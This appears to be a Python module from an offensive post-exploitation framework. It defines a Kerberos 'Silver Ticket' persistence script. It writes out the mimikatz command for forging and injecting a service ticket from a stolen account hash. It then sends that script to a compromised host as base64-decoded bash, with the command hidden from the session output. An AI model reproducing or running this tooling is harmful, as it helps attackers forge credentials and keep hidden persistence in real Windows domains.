"""Kerberos silver ticket script."""
from ..base import OperatorScript, ScriptResult

class SilverTicket(OperatorScript):
    name = "Silver Ticket"
    description = "Kerberos silver ticket creation"
    category = "persist"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] KERBEROS SILVER TICKET"
echo "Requires: Service account hash"
echo "mimikatz: kerberos::golden /user:USER /domain:DOMAIN /sid:SID /target:SERVICE /service:cifs /rc4:HASH /ptt"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Silver ticket info...[/bold cyan]")
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return ScriptResult(success=True, output="Silver ticket info executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
